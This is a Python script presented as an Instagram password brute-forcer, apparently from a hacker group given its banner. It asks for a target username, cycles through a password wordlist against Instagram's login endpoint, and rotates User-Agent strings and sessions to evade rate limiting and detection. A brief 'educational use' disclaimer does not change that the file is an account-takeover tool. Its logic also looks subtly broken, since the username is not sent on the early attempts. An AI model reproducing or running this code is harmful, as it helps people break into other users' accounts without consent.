import os
import requests
import random
import time
import sys
import pyfiglet
from bs4 import BeautifulSoup

# Disclaimer
DISCLAIMER = """
[!] DISCLAIMER: This script is for educational and authorized use only.
    Unauthorized use of brute force attacks is illegal and unethical.
    Use this script responsibly and ensure you have explicit permission
    to test the security of any account or system.
"""
print(DISCLAIMER)

# Banner
banner = pyfiglet.figlet_format("RAVEES")
print(banner)
print("# REMEMBER RAVEES # REMEMBER MOHAMMAD KAIF # IMANNINFOSEC # TEAM SYNC")
print("EAGLES OF INDIA")
print("DON'T TRY TO CHASE US, WE ARE UNBEATABLE, WE ARE UNDEFEATABLE\n")

# Check Python version
if sys.version_info[0] != 3:
    print("This script requires Python 3.x. Please run it with Python 3.")
    sys.exit()

# Constants
PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = "https://www.instagram.com/accounts/login/ajax/"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]
DELAY = 2  # Fixed delay between requests
PAYLOAD = {}
COOKIES = {}


def get_random_user_agent():
    """Return a random User-Agent string."""
    return random.choice(USER_AGENTS)


def create_form():
    """Generate form data and cookies for login."""
    form = {}
    cookies = {}
    headers = {
        "User-Agent": get_random_user_agent(),
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
    }

    session = requests.Session()
    try:
        response = session.get("https://www.instagram.com/accounts/login/", headers=headers)
        for cookie in response.cookies:
            cookies[cookie.name] = cookie.value
    except requests.RequestException as e:
        print(f"[!] Error creating form: {e}")
        sys.exit()

    return form, cookies, session


def try_password(username, index, password, session):
    """Attempt to log in with a given password."""
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES, session = create_form()
        PAYLOAD["username"] = username
    PAYLOAD["password"] = password

    headers = {
        "User-Agent": get_random_user_agent(),
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
    }

    try:
        response = session.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=headers)
        if "authenticated\": true" in response.text:
            print(f"\n[+] Password found: {password}")
            return True
        elif "checkpoint_required" in response.text:
            print("[-] CAPTCHA or checkpoint required. Try again later.")
            return False
        else:
            print(f"[!] Attempt {index}: Failed with password: {password}")
            return False
    except requests.RequestException as e:
        print(f"[!] Error during request: {e}")
        return False


def main():
    """Main function to orchestrate the brute force process."""
    print("\n---------- Welcome to Instagram Brute Force by Ravees ----------\n")

    if not os.path.isfile(PASSWORD_FILE):
        print(f"[!] Password file '{PASSWORD_FILE}' not found. Please create it and try again.")
        return

    username = input("[+] Enter the target Instagram username: ").strip()

    try:
        with open(PASSWORD_FILE, "r") as file:
            passwords = [line.strip() for line in file if len(line.strip()) >= MIN_PASSWORD_LENGTH]
    except Exception as e:
        print(f"[!] Error reading password file: {e}")
        return

    if not passwords:
        print("[!] No valid passwords found in the file. Ensure it contains passwords with at least 6 characters.")
        return

    print(f"[+] Loaded {len(passwords)} passwords to try.\n")

    session = requests.Session()
    PAYLOAD, COOKIES, session = create_form()

    for index, password in enumerate(passwords, start=1):
        print(f"[+] Trying password {index}/{len(passwords)}: {password}")
        if try_password(username, index, password, session):
            break
        time.sleep(DELAY)  # Delay to avoid rate limiting

    print("\n[!] Process completed. Exiting.")


if __name__ == "__main__":
    main()
